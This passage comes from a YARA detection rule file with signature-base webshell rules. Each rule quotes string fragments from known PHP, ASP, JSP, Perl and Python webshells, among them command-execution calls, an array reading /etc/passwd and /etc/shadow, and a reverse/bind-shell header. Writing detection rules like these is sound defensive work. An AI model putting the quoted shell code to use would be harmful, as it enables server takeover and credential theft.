		$s2 = "if (@passthru($cmd)) { echo \" -->\"; $this->output_state(1, \"passthru"
		$s3 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = "

	condition:
		1 of them
}
rule SIGNATURE_BASE_Worse_Linux_Shell_Php {
    meta:
		description = "Semi-Auto-generated  - file Worse Linux Shell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "e223e2a9-7c7a-597a-8b90-a63ee11805ea"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4485-L4496"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "8338c8d9eab10bd38a7116eb534b5fa2"
		logic_hash = "47801296b700e85f9e08857eb06f845ef8ed3f88b7d0de34d4b7c47cef6cc7fb"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "print \"<tr><td><b>Server is:</b></td><td>\".$_SERVER['SERVER_SIGNATURE'].\"</td"
		$s2 = "print \"<tr><td><b>Execute command:</b></td><td><input size=100 name=\\\"_cmd"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Cyberlords_Sql_Php_Php {
    meta:
		description = "Semi-Auto-generated  - file cyberlords_sql.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "41730336-0dce-5ed9-95b0-c911a4e3cb48"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4497-L4510"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "03b06b4183cb9947ccda2c3d636406d4"
		logic_hash = "b3286f9fd86c90c5afc79801b6d65c9ae52ee1c37da93ff15461d84f37ef8019"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Coded by n0 [nZer0]"
		$s1 = " www.cyberlords.net"
		$s2 = "U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAMUExURf///wAAAJmZzAAAACJoURkAAAAE"
		$s3 = "return \"<BR>Dump error! Can't write to \".htmlspecialchars($file);"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Cmd_Asp_5_1_Asp {
    meta:
		description = "Semi-Auto-generated  - file cmd-asp-5.1.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "fc204ab8-892d-5435-a737-a185ca32e938"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4511-L4522"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "8baa99666bf3734cbdfdd10088e0cd9f"
		logic_hash = "a41c83da1a65e67b6f4ac6ad7cc8702486957ab0c7dda658d071e603338c324b"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Call oS.Run(\"win.com cmd.exe /c del \"& szTF,0,True)" fullword
		$s3 = "Call oS.Run(\"win.com cmd.exe /c \"\"\" & szCMD & \" > \" & szTF &" fullword

	condition:
		1 of them
}
rule SIGNATURE_BASE_Pws_Php_Php {
    meta:
		description = "Semi-Auto-generated  - file pws.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "1ec47c33-dbec-50bd-b4b0-8f00b704a816"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4523-L4535"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "ecdc6c20f62f99fa265ec9257b7bf2ce"
		logic_hash = "98dae8aab5bfd58f4264e318f5a5b5900b38687386f9d7f09c31da0f51d57bc0"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "<div align=\"left\"><font size=\"1\">Input command :</font></div>" fullword
		$s1 = "<input type=\"text\" name=\"cmd\" size=\"30\" class=\"input\"><br>" fullword
		$s4 = "<input type=\"text\" name=\"dir\" size=\"30\" value=\"<? passthru(\"pwd\"); ?>"

	condition:
		2 of them
}
rule SIGNATURE_BASE_PHP_Shell_Php_Php {
    meta:
		description = "Semi-Auto-generated  - file PHP Shell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "6978126c-5414-52d2-b085-6e5589716d93"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4536-L4547"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "a2f8fa4cce578fc9c06f8e674b9e63fd"
		logic_hash = "2d5b6e08bfe9e1551dab12b01189dadc924c097427c996684bab96c48d528395"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "echo \"</form><form action=\\\"$SFileName?$urlAdd\\\" method=\\\"post\\\"><input"
		$s1 = "echo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type="

	condition:
		all of them
}
rule SIGNATURE_BASE_Ayyildiz_Tim___AYT__Shell_V_2_1_Biz_Html {
    meta:
		description = "Semi-Auto-generated  - file Ayyildiz Tim  -AYT- Shell v 2.1 Biz.html.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "d50a8669-fd28-59d2-9f00-f4fe2b85dc22"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4548-L4561"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "8a8c8bb153bd1ee097559041f2e5cf0a"
		logic_hash = "9e2d56b49df65a2c13e15f97ec91cdbb6852d86e86f921d7c8a4db82cbea12f5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Ayyildiz"
		$s1 = "TouCh By iJOo"
		$s2 = "First we check if there has been asked for a working directory"
		$s3 = "http://ayyildiz.org/images/whosonline2.gif"

	condition:
		2 of them
}
rule SIGNATURE_BASE_EFSO_2_Asp {
    meta:
		description = "Semi-Auto-generated  - file EFSO_2.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "f0566790-b41c-5167-b7ec-19e7d04256d1"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4562-L4573"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b5fde9682fd63415ae211d53c6bfaa4d"
		logic_hash = "15e5419854bcbb08f28fff1e266cca7a004f01ec0a5c313c107ec17c3aa7ffee"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Ejder was HERE"
		$s1 = "*~PU*&BP[_)f!8c2F*@#@&~,P~P,~P&q~8BPmS~9~~lB~X`V,_,F&*~,jcW~~[_c3TRFFzq@#@&PP,~~"

	condition:
		2 of them
}
rule SIGNATURE_BASE_Lamashell_Php {
    meta:
		description = "Semi-Auto-generated  - file lamashell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "cbbb3377-ef9c-5fd1-a8b8-2b730fb5ef28"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4574-L4586"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "de9abc2e38420cad729648e93dfc6687"
		logic_hash = "5e156c3057338fa7b306b91dd979851dd56b8b698cfe99e1d7b6d096a4c580e7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "lama's'hell" fullword
		$s1 = "if($_POST['king'] == \"\") {"
		$s2 = "if (move_uploaded_file($_FILES['fila']['tmp_name'], $curdir.\"/\".$_FILES['f"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Ajax_PHP_Command_Shell_Php {
    meta:
		description = "Semi-Auto-generated  - file Ajax_PHP Command Shell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "cae2e035-ae7b-589b-b2d9-e709028274c5"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4587-L4599"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "93d1a2e13a3368a2472043bd6331afe9"
		logic_hash = "37cba26018f3d37194a143871012a61a7bcee6775d2cf5f93a52b779010d3260"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "newhtml = '<b>File browser is under construction! Use at your own risk!</b> <br>"
		$s2 = "Empty Command..type \\\"shellhelp\\\" for some ehh...help"
		$s3 = "newhtml = '<font size=0><b>This will reload the page... :(</b><br><br><form enct"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Jspwebshell_1_2_Jsp {
    meta:
		description = "Semi-Auto-generated  - file JspWebshell 1.2.jsp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "edfe6a3d-7d56-52ad-a376-cec5722e87b7"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4600-L4613"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "70a0ee2624e5bbe5525ccadc467519f6"
		logic_hash = "32b3ddb00f89a3540118fe8ce5fc070556b00030dcf2b21245d38ae66e6cbc14"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "JspWebshell"
		$s1 = "CreateAndDeleteFolder is error:"
		$s2 = "<td width=\"70%\" height=\"22\">&nbsp;<%=env.queryHashtable(\"java.c"
		$s3 = "String _password =\"111\";"

	condition:
		2 of them
}
rule SIGNATURE_BASE_Sincap_Php_Php {
    meta:
		description = "Semi-Auto-generated  - file Sincap.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "8c4dc7b1-94ce-5528-8442-eae05d2c9980"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4614-L4626"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b68b90ff6012a103e57d141ed38a7ee9"
		logic_hash = "e708a7dcb26ff7d0208c1f092e14e701f2ae94c4ffca019f13064bbe04ef74d7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$baglan=fopen(\"/tmp/$ekinci\",'r');"
		$s2 = "$tampon4=$tampon3-1"
		$s3 = "@aventgrup.net"

	condition:
		2 of them
}
rule SIGNATURE_BASE_Test_Php_Php {
    meta:
		description = "Semi-Auto-generated  - file Test.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "58d73264-6507-5560-ad3e-0cc86c2ee291"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4627-L4639"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "77e331abd03b6915c6c6c7fe999fcb50"
		logic_hash = "575a2eeadc8113d779057f98e978ed4f8914546117b57944bf65f1d6d84c9521"
		score = 50
		quality = 85
		tags = ""

	strings:
		$s0 = "$yazi = \"test\" . \"\\r\\n\";" fullword
		$s2 = "fwrite ($fp, \"$yazi\");" fullword
		$s3 = "$entry_line=\"HACKed by EntriKa\";" fullword

	condition:
		1 of them
}
rule SIGNATURE_BASE_Phyton_Shell_Py {
    meta:
		description = "Semi-Auto-generated  - file Phyton Shell.py.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "2f55d60d-94f3-508d-a2d0-5ab59e3fdab3"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4640-L4653"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "92b3c897090867c65cc169ab037a0f55"
		logic_hash = "ac16a95cd1fb09c93b315e3cd7d57c1ebec322b641f515854fb73a61393dd365"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "sh_out=os.popen(SHELL+\" \"+cmd).readlines()" fullword
		$s2 = "#   d00r.py 0.3a (reverse|bind)-shell in python by fQ" fullword
		$s3 = "print \"error; help: head -n 16 d00r.py\"" fullword
		$s4 = "print \"PW:\",PW,\"PORT:\",PORT,\"HOST:\",HOST" fullword

	condition:
		1 of them
}
rule SIGNATURE_BASE_Mysql_Tool_Php_Php {
    meta:
		description = "Semi-Auto-generated  - file mysql_tool.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "c67197d1-6e40-5bf2-9e1b-6ada43529435"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4654-L4666"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "5fbe4d8edeb2769eda5f4add9bab901e"
		logic_hash = "9f49bd6c56c919f678ecada82ff3d801c82c98a8abdee85cda1ec7e5b6756012"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$error_text = '<strong>Failed selecting database \"'.$this->db['"
		$s1 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERV"
		$s4 = "<div align=\"center\">The backup process has now started<br "

	condition:
		1 of them
}
rule SIGNATURE_BASE_Zehir_4_Asp {
    meta:
		description = "Semi-Auto-generated  - file Zehir 4.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ea7df4e1-d4e2-5a58-a014-d12cb9afaf79"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4667-L4678"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "7f4e12e159360743ec016273c3b9108c"
		logic_hash = "69063d866daf1709df81fa22d76177bf8d552e19725a94db4a1b2fca79387faf"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s2 = "</a><a href='\"&dosyapath&\"?status=10&dPath=\"&f1.path&\"&path=\"&path&\"&Time="
		$s4 = "<input type=submit value=\"Test Et!\" onclick=\""

	condition:
		1 of them
}
rule SIGNATURE_BASE_Sh_Php_Php {
    meta:
		description = "Semi-Auto-generated  - file sh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "da691516-d6c9-5c4b-85c3-f1cd7fc96ae7"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4679-L4690"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "330af9337ae51d0bac175ba7076d6299"
		logic_hash = "b0c3307d451e5d7dadece114e2888503a46038e2edb2ff32bf566ce47b300e76"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "$ar_file=array('/etc/passwd','/etc/shadow','/etc/master.passwd','/etc/fstab','/e"
		$s2 = "Show <input type=text size=5 value=\".((isset($_POST['br_st']))?$_POST['br_st']:"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Phpbackdoor15_Php {
    meta:
		description = "Semi-Auto-generated  - file phpbackdoor15.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "a93b881b-3050-5f43-803c-4a571aaaef82"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4691-L4703"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "0fdb401a49fc2e481e3dfd697078334b"
		logic_hash = "cdd105f36593e8326ca32bf7cf1fba6fb754e7305c91fe6c078323db8f59b23c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "echo \"fichier telecharge dans \".good_link(\"./\".$_FILES[\"fic\"][\"na"
		$s2 = "if(move_uploaded_file($_FILES[\"fic\"][\"tmp_name\"],good_link(\"./\".$_FI"
		$s3 = "echo \"Cliquez sur un nom de fichier pour lancer son telechargement. Cliquez s"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Phpjackal_Php {
    meta:
		description = "Semi-Auto-generated  - file phpjackal.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ae46cb97-1ff8-50ba-856f-c38fbb1e5163"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4704-L4715"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "ab230817bcc99acb9bdc0ec6d264d76f"
		logic_hash = "6e2ff262aecd08e5feaa274a7fd128d75565d6cc03341da7cbeb2949070705e5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s3 = "$dl=$_REQUEST['downloaD'];"
		$s4 = "else shelL(\"perl.exe $name $port\");"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Sql_Php_Php {
    meta:
		description = "Semi-Auto-generated  - file sql.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "41730336-0dce-5ed9-95b0-c911a4e3cb48"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4716-L4728"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "8334249cbb969f2d33d678fec2b680c5"
		logic_hash = "875bdaa0072f869c983526d0aab20b4faa9187a3f32b8024658114a4c908b825"
		score = 75
		quality = 60
		tags = ""

	strings:
		$s1 = "fputs ($fp, \"# RST MySQL tools\\r\\n# Home page: http://rst.void.ru\\r\\n#"
		$s2 = "http://rst.void.ru"
		$s3 = "print \"<a href=\\\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Cgi_Python_Py {
    meta:
		description = "Semi-Auto-generated  - file cgi-python.py.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "75e99d10-3cdf-5f87-9933-4ce5ebe18b09"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4729-L4741"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "0a15f473e2232b89dae1075e1afdac97"
		logic_hash = "37c6c7db32a52c8a83ff85f0a50c6fa71e833b9e6d20b1f95e9512fe8bbd0aee"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "a CGI by Fuzzyman"
		$s1 = "\"\"\"+fontline +\"Version : \" + versionstring + \"\"\", Running on : \"\"\" + "
		$s2 = "values = map(lambda x: x.value, theform[field])     # allows for"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Ru24_Post_Sh_Php_Php {
    meta:
		description = "Semi-Auto-generated  - file ru24_post_sh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "78669d3e-629b-591a-a766-923e37d1fdba"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4742-L4754"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "5b334d494564393f419af745dc1eeec7"
		logic_hash = "e81e5345bbe07ca85c94a3d8411f0dd3c418689ccae7115c098f718f9093b3bf"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "<title>Ru24PostWebShell - \".$_POST['cmd'].\"</title>" fullword
		$s3 = "if ((!$_POST['cmd']) || ($_POST['cmd']==\"\")) { $_POST['cmd']=\"id;pwd;uname -a"
		$s4 = "Writed by DreAmeRz" fullword

	condition:
		1 of them
}
rule SIGNATURE_BASE_Dtool_Pro_Php {
    meta:
		description = "Semi-Auto-generated  - file DTool Pro.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "c02c522c-8418-5760-869a-52b41785bebc"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4755-L4767"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "366ad973a3f327dfbfb915b0faaea5a6"
		logic_hash = "e8f8b4ca2ab4607e700e897671fd230280763a70897b8ccfc31b3bcb7f2a1f4a"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "r3v3ng4ns\\nDigite"
		$s1 = "if(!@opendir($chdir)) $ch_msg=\"dtool: line 1: chdir: It seems that the permissi"
		$s3 = "if (empty($cmd) and $ch_msg==\"\") echo (\"Comandos Exclusivos do DTool Pro\\n"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Telnetd_Pl {
    meta:
		description = "Semi-Auto-generated  - file telnetd.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "05b5d247-3133-5902-a2ee-b84fa89c7f32"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4768-L4782"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "5f61136afd17eb025109304bd8d6d414"
		logic_hash = "faf21758b311fa4c2d11cd60169e6c9a67282cf739b73664456691361a480419"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "0ldW0lf" fullword
		$s1 = "However you are lucky :P"
		$s2 = "I'm FuCKeD"
		$s3 = "ioctl($CLIENT{$client}->{shell}, &TIOCSWINSZ, $winsize);#"
		$s4 = "atrix@irc.brasnet.org"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Php_Include_W_Shell_Php {
    meta:
		description = "Semi-Auto-generated  - file php-include-w-shell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ddcf9031-2ec8-5a86-8326-60e4a699f494"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4783-L4794"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "4e913f159e33867be729631a7ca46850"
		logic_hash = "a63910d97b7ef447b2cadb7de12943d3dbb6eada27d3097b8acf58d9b65b6f60"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$dataout .= \"<td><a href='$MyLoc?$SREQ&incdbhost=$myhost&incdbuser=$myuser&incd"
		$s1 = "if($run == 1 && $phpshellapp && $phpshellhost && $phpshellport) $strOutput .= DB"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Safe0Ver_Shell__Safe_Mod_Bypass_By_Evilc0Der_Php {
    meta:
		description = "Semi-Auto-generated  - file Safe0ver Shell -Safe Mod Bypass By Evilc0der.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "25971f62-33ee-5ed6-8d72-118be5bd2deb"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4795-L4807"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "6163b30600f1e80d2bb5afaa753490b6"
		logic_hash = "46f6bb38f1175e02b03047c06a7aed968b1c1ce2e28cc4b88e15703040e91592"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Safe0ver" fullword
		$s1 = "Script Gecisi Tamamlayamadi!"
		$s2 = "document.write(unescape('%3C%68%74%6D%6C%3E%3C%62%6F%64%79%3E%3C%53%43%52%49%50%"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Shell_Php_Php {
    meta:
		description = "Semi-Auto-generated  - file shell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "eaf243cb-fa26-5f34-a724-60a08acff636"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4808-L4820"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "1a95f0163b6dea771da1694de13a3d8d"
		logic_hash = "dbd08e71dc512f8dcf009150fb4448cd3608291ef9078c7e6b86e6f8d820bd94"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "/* We have found the parent dir. We must be carefull if the parent " fullword
		$s2 = "$tmpfile = tempnam('/tmp', 'phpshell');"
		$s3 = "if (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $command, $regs)) {" fullword

	condition:
		1 of them
}
rule SIGNATURE_BASE_Telnet_Cgi {
    meta:
		description = "Semi-Auto-generated  - file telnet.cgi.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "4ca3dace-cd80-58e4-a4de-47dcc64dac0e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4821-L4833"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "dee697481383052980c20c48de1598d1"
		logic_hash = "689c1d43c64aa7469989686c60fc9ab46acde42fdf3c1157bae1e2b8373c845f"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "W A R N I N G: Private Server"
		$s2 = "print \"Set-Cookie: SAVEDPWD=;\\n\"; # remove password cookie"
		$s3 = "$Prompt = $WinNT ? \"$CurrentDir> \" : \"[admin\\@$ServerName $C"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Ironshell_Php {
    meta:
		description = "Semi-Auto-generated  - file ironshell.php.txt"
